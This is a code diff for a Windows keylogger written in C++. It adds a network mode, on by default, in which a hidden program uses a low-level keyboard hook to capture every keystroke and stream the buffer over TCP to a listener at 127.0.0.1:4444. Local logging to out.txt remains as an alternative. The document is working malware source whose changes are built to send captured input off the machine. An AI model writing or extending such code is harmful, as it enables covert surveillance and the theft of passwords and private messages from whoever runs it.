@@ -3,11 +3,18 @@
 #include <string>
 #include <map>
 
+#include "TCPClient.h"
+
+static bool isNetworkMode = true;
+static TCPClient* tcpClient;
+
 HHOOK _kbHook;
 HHOOK _mHook;
 
 KBDLLHOOKSTRUCT kbdStruct;
 HANDLE out_file;
+
+std::wstring processingBuffer;
 
 std::map<int, std::wstring> specialKeyMap = {
 		{VK_BACK, L"[BACKSPACE]"},
@@ -50,6 +57,7 @@ void initOutFile(std::wstring outFileName) {
 	}
 }
 
+// Useful -> https://learn.microsoft.com/en-us/windows/win32/fileio/appending-one-file-to-another-file
 DWORD writeBufferToOutFile(std::wstring strToWrite) {
 	DWORD dwBytesWritten = 0;
 	DWORD dwPos = SetFilePointer(out_file, 0, 0x00, FILE_END);
@@ -84,16 +92,11 @@ bool isUppercase() {
 		|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0;
 }
 
-// Useful -> https://learn.microsoft.com/en-us/windows/win32/fileio/appending-one-file-to-another-file
-
-int saveKeystroke(int keyStroke) {
-
+void handleKeystroke(int keyStroke) {
 	// Handle mouse events with separate func
 	if (keyStroke == VK_LBUTTON || keyStroke == VK_RBUTTON || keyStroke == VK_MBUTTON) {
-		return 0;
+		return;
 	}
-
-	std::wstring writeFileBuf;
 
 	wchar_t key;
 	HWND foregroundWindow = GetForegroundWindow();
@@ -101,12 +104,7 @@ int saveKeystroke(int keyStroke) {
 	DWORD threadId = GetWindowThreadProcessId(foregroundWindow, 0x00);
 	layout = GetKeyboardLayout(threadId);
 
-	if (logSpecialKey(keyStroke, writeFileBuf)) {
-		writeBufferToOutFile(writeFileBuf);
-		writeFileBuf.clear();
-		return 0;
-	}
-	else {
+	if (!logSpecialKey(keyStroke, processingBuffer)) {
 		key = MapVirtualKeyExW(keyStroke, MAPVK_VK_TO_CHAR, layout);
 
 		// Handles unicode by default
@@ -114,15 +112,23 @@ int saveKeystroke(int keyStroke) {
 			key = tolower(key);
 		}
 
-		writeFileBuf += key;
-
-		writeBufferToOutFile(writeFileBuf);
-		writeFileBuf.clear();
-		return 0;
+		processingBuffer += key;
 	}
-	
 }
 
+int saveProcessingBufferToOutFile(int keystroke) {
+	handleKeystroke(keystroke);
+	writeBufferToOutFile(processingBuffer);
+	processingBuffer.clear();
+	return 0;
+}
+
+int sendProcessingBufferToRemoteServer(int keystroke) {
+	handleKeystroke(keystroke);
+	tcpClient->sendWideStringBuffer(processingBuffer);
+	processingBuffer.clear();
+	return 0;
+}
 
 int saveMouseOnClickEvent() {
 	return 0;
@@ -132,7 +138,12 @@ LRESULT __stdcall keyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) 
 	if (nCode >= 0) {
 		if (wParam == WM_KEYDOWN) {
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			saveKeystroke(kbdStruct.vkCode);
+			if (isNetworkMode) {
+				sendProcessingBufferToRemoteServer(kbdStruct.vkCode);
+			}
+			else {
+				saveProcessingBufferToOutFile(kbdStruct.vkCode);
+			}
 		}
 	}
 
@@ -178,12 +189,16 @@ int main() {
 	std::wstring outFileName = L"out.txt";
 
 	hideAppWindow();
-	initOutFile(outFileName);
+	if (isNetworkMode) {
+		tcpClient = new TCPClient("127.0.0.1", 4444);
+	}
+	else {
+		initOutFile(outFileName);
+	}
 	initKbHook();
 
 	// run indefinitely
 	MSG msg;
-	while (GetMessage(&msg, 0x00, 0, 0))
-	{
+	while (GetMessage(&msg, 0x00, 0, 0)) {
 	}
 }
